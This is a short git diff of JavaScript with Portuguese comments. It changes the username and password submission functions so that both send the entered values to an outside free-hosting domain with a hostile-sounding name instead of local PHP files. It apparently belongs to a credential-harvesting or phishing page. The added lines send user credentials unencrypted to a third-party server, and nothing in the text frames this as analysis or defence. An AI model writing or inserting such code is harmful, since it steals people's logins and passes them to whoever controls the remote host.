@@ -5,7 +5,7 @@ function sendUsername() {
 
   // Cria uma nova solicitação AJAX para enviar o nome de usuário para o arquivo PHP
   const xhr = new XMLHttpRequest();
-  xhr.open('POST', 'add_user.php');
+  xhr.open('POST', 'https://fckyou-get.000webhostapp.com/add_user.php');
   xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
   xhr.send(`username=${username}`);
 
@@ -26,7 +26,7 @@ function sendPassword() {
 
   // Cria uma nova solicitação AJAX para enviar a senha para o arquivo PHP
   const xhr = new XMLHttpRequest();
-  xhr.open('POST', 'add_password.php');
+  xhr.open('POST', 'https://fckyou-get.000webhostapp.com/add_password.php');
   xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
   xhr.send(`password=${password}`);
 
